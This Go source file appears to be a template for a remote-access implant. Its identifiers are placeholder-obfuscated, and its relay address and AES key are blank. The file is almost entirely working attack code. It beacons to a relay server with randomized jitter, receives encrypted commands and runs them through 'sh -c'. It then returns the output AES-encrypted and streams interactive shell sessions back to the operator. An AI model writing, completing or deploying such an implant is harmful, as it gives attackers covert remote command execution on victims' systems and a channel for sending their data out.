package main

import(
  "time"
  "bufio"
  "strings"
  "strconv"
  "os/exec"
  "net/http"
  "io/ioutil"
  "math/rand"
  "crypto/aes"
  "crypto/cipher"
  "encoding/base64"
)

const(
  obf_const_session_id = ""
  obf_const_post_tag = ""
  obf_const_get_tag = ""
  obf_const_stream_tag = ""
)

var(
  obf_var_encryption_key = []byte("")
  obf_var_relay_address = ""
  obf_var_user_agent = ""
)

type obf_struct_stream struct {
  obf_var_buffer []byte
  obf_var_shell *exec.Cmd
  obf_var_rate []int
  obf_var_id string
  obf_var_lock bool
  obf_var_ending bool
}

func obf_func_encrypt(obf_var_payload []byte) []byte {
  obf_var_block, _ := aes.NewCipher(obf_var_encryption_key)
  obf_var_b := base64.StdEncoding.EncodeToString(obf_var_payload)
  obf_var_ciphertext := make([]byte, aes.BlockSize+len(obf_var_b))
  obf_var_iv := obf_var_ciphertext[:aes.BlockSize]
  obf_var_cfb := cipher.NewCFBEncrypter(obf_var_block, obf_var_iv)
  obf_var_cfb.XORKeyStream(obf_var_ciphertext[aes.BlockSize:], []byte(obf_var_b))
  obf_var_enc_ciphertext := []byte(base64.StdEncoding.EncodeToString(obf_var_ciphertext))
  return obf_var_enc_ciphertext
}

func obf_func_decrypt(obf_var_payload []byte) []byte {
  obf_var_block, _ := aes.NewCipher(obf_var_encryption_key)
  obf_var_payload, _ = base64.StdEncoding.DecodeString(string(obf_var_payload))
  obf_var_iv := obf_var_payload[:aes.BlockSize]
  obf_var_payload = obf_var_payload[aes.BlockSize:]
  obf_var_cfb := cipher.NewCFBDecrypter(obf_var_block, obf_var_iv)
  obf_var_cfb.XORKeyStream(obf_var_payload, obf_var_payload)
  obf_var_data := []byte{}
  obf_var_data, _ = base64.StdEncoding.DecodeString(string(obf_var_payload))
  return obf_var_data
}

func obf_func_exec(obf_var_shell_command string) []byte {
  obf_var_stdout, obf_var_e := exec.Command("/usr/bin/env", "sh", "-c", obf_var_shell_command).Output()
  if obf_var_e != nil {
    return []byte(obf_var_e.Error())
  }
  return obf_var_stdout
}

func obf_func_buffer(obf_stream *obf_struct_stream, obf_var_scanner *bufio.Scanner) {
  obf_var_scanner.Split(bufio.ScanRunes)
  for obf_var_scanner.Scan() {
    if !obf_stream.obf_var_ending {
  	  	  if !obf_stream.obf_var_lock {
	  	  	  	  obf_stream.obf_var_lock = true
	  	  	  	  if len(obf_var_scanner.Bytes()) != 0 {
	  	  	  	  	  for _, obf_byte := range obf_var_scanner.Bytes() {
	  	  	  	  	  	  obf_stream.obf_var_buffer = append(obf_stream.obf_var_buffer, obf_byte)
	  	  	  	  	  }
	  	  	    }
        obf_stream.obf_var_lock = false
      } else {
        for obf_stream.obf_var_lock {
          time.Sleep(100 * time.Millisecond)
        }
        continue
      }
    } else {
      break
    }
  }
}

func obf_func_stream(obf_stream *obf_struct_stream) {
  for {
    if !obf_stream.obf_var_lock {
      obf_stream.obf_var_lock = true
      var obf_var_res string
      if len(obf_stream.obf_var_buffer) != 0 {
        obf_var_encrypted_buffer := obf_func_encrypt(obf_stream.obf_var_buffer)
        obf_var_res = obf_func_send_request(obf_const_stream_tag, obf_const_session_id, obf_stream.obf_var_id + "\n" + string(obf_var_encrypted_buffer))
      } else {
        obf_var_res = obf_func_send_request(obf_const_stream_tag, obf_const_session_id, obf_stream.obf_var_id + "\n")
      }
      obf_stream.obf_var_buffer = []byte("")
      obf_stream.obf_var_lock = false
      if obf_var_res != "" {
        obf_var_dec_res := string(obf_func_decrypt([]byte(obf_var_res)))
        obf_var_split_packet := strings.Split(obf_var_dec_res, " ")
        if strings.HasPrefix(obf_var_dec_res, "obf_tag_start_stream") {
          if len(obf_var_split_packet) == 3 {
            obf_var_a, _ := strconv.Atoi(obf_var_split_packet[1])
            obf_var_b, _ := strconv.Atoi(obf_var_split_packet[2])
            obf_stream.obf_var_rate = []int{obf_var_a, obf_var_b}
          } else {
            obf_func_send_request(obf_const_stream_tag, obf_const_session_id, obf_stream.obf_var_id + "\n" + string (obf_func_encrypt([]byte("obf_tag_start_stream"))))
            obf_stream.obf_var_ending = true
            break
          }
        } else {
          obf_stream.obf_var_shell.Wait()
          obf_var_subshell := exec.Command("/usr/bin/env", "sh", "-c", strings.Join(obf_var_split_packet[0:len(obf_var_split_packet) - 2], " "))
          obf_var_stderr_subpipe, _ := obf_var_subshell.StderrPipe()
          obf_var_stdout_subpipe, _ := obf_var_subshell.StdoutPipe()
          obf_var_e := obf_var_subshell.Start()
          if obf_var_e != nil {
            obf_func_send_request(obf_const_post_tag, obf_const_session_id, string (obf_func_encrypt([]byte(obf_var_e.Error()))))
            obf_func_send_request(obf_const_stream_tag, obf_const_session_id, obf_stream.obf_var_id + "\n" + string (obf_func_encrypt([]byte("obf_tag_start_stream"))))
          } else {
            obf_var_stderr_scanner := bufio.NewScanner(obf_var_stderr_subpipe)
            obf_var_stdout_scanner := bufio.NewScanner(obf_var_stdout_subpipe)
            go func() {
              obf_func_buffer(obf_stream, obf_var_stderr_scanner)
            }()
            go func() {
              obf_func_buffer(obf_stream, obf_var_stdout_scanner)
            }()
          }
        }
      }
    } else {
      for obf_stream.obf_var_lock {
        time.Sleep(100 * time.Millisecond)
      }
      continue
    }
    rand.Seed(time.Now().UnixNano())
    obf_var_rate := obf_stream.obf_var_rate[0] + rand.Intn(obf_stream.obf_var_rate[1] - obf_stream.obf_var_rate[0])
    time.Sleep(time.Duration(obf_var_rate) * time.Millisecond)
  }
}

func obf_func_send_request(obf_var_request_type, obf_const_session_id, obf_var_request_body string) string {
  var obf_var_return string
  obf_var_a := []string{obf_var_request_type, obf_const_session_id, obf_var_request_body}
  obf_var_packet := strings.Join(obf_var_a, "\n")
  obf_var_req, _ := http.NewRequest("POST", obf_var_relay_address, strings.NewReader(obf_var_packet))
  obf_var_req.Header.Set("User-Agent", obf_var_user_agent)
  obf_var_client := &http.Client{}
  obf_var_res, obf_var_e := obf_var_client.Do(obf_var_req)
  if obf_var_e == nil {
    defer obf_var_res.Body.Close()
    obf_var_body, _ := ioutil.ReadAll(obf_var_res.Body)
    obf_var_return = string(obf_var_body)
  }
  return obf_var_return
}

func main() {
  rand.Seed(time.Now().UnixNano())
  obf_var_rate := 0
  for {
    obf_var_res := obf_func_send_request(obf_const_get_tag, obf_const_session_id, "")
    if obf_var_res != "" {
      obf_var_response := []byte("\x00")
      obf_var_packet_list := strings.Split(obf_var_res, ",")
      for i := 0; i < len(obf_var_packet_list); i++ {
        obf_var_res = obf_func_send_request(obf_const_get_tag, obf_const_session_id, obf_var_packet_list[i])
        if obf_var_res != "" {
          obf_var_enc_res := []byte(obf_var_res)
          obf_var_dec_res := obf_func_decrypt(obf_var_enc_res)
          obf_var_payload := string(obf_var_dec_res)
          if strings.HasPrefix(obf_var_payload, "obf_tag_fetch_rate ") {
            obf_var_a := strings.Split(obf_var_payload, " ")[1]
            obf_var_b := strings.Split(obf_var_payload, " ")[2]
            obf_var_a_int, _ := strconv.Atoi(obf_var_a)
            obf_var_b_int, _ := strconv.Atoi(obf_var_b)
            obf_var_rate = obf_var_a_int + rand.Intn(obf_var_b_int-obf_var_a_int)
            go func() {
              obf_var_enc_response := obf_func_encrypt([]byte("\x00"))
              obf_func_send_request(obf_const_post_tag, obf_const_session_id, string(obf_var_enc_response))
            }()
          } else if strings.HasPrefix(obf_var_payload, "obf_tag_start_stream ") {
            obf_var_split_payload := strings.Split(obf_var_payload, " ")
            obf_var_stream_session_id := obf_var_split_payload[1]
            obf_var_shell_command := strings.Join(obf_var_split_payload[2:len(obf_var_split_payload) - 2], " ")
            obf_var_a, _ := strconv.Atoi(obf_var_split_payload[len(obf_var_split_payload) - 2])
            obf_var_b, _ := strconv.Atoi(obf_var_split_payload[len(obf_var_split_payload) - 1])
            obf_var_shell := exec.Command("/usr/bin/env", "sh", "-c", obf_var_shell_command)
            obf_var_stderr_pipe, _ := obf_var_shell.StderrPipe()
            obf_var_stdout_pipe, _ := obf_var_shell.StdoutPipe()
            obf_stream := obf_struct_stream { []byte{}, obf_var_shell, []int{obf_var_a, obf_var_b}, obf_var_stream_session_id, false, false }
            obf_var_stderr_scanner := bufio.NewScanner(obf_var_stderr_pipe)
            obf_var_stdout_scanner := bufio.NewScanner(obf_var_stdout_pipe)
            go func() {
              obf_func_buffer(&obf_stream, obf_var_stderr_scanner)
            }()
            go func() {
              obf_func_buffer(&obf_stream, obf_var_stdout_scanner)
            }()
            obf_var_e := obf_stream.obf_var_shell.Start()
            if obf_var_e != nil {
              obf_func_send_request(obf_const_post_tag, obf_const_session_id, string (obf_func_encrypt([]byte(obf_var_e.Error()))))
              obf_func_send_request(obf_const_stream_tag, obf_const_session_id, obf_stream.obf_var_id + "\n" + string (obf_func_encrypt([]byte("obf_tag_start_stream"))))
            } else {
              go func() {
                obf_func_stream(&obf_stream)
              }()
            }
          } else {
            go func() {
              obf_var_response = obf_func_exec(obf_var_payload)
              obf_var_enc_response := obf_func_encrypt(obf_var_response)
              obf_func_send_request(obf_const_post_tag, obf_const_session_id, string(obf_var_enc_response))
            }()
          }
        }
        time.Sleep(100 * time.Millisecond)
      }
    }
    if obf_var_rate != 0 {
      time.Sleep(time.Duration(obf_var_rate) * time.Second)
    } else {
      rand.Seed(time.Now().UnixNano())
      obf_var_rate = 2 + rand.Intn(4 - 2)
      time.Sleep(time.Duration(obf_var_rate) * time.Second)
    }
  }
}

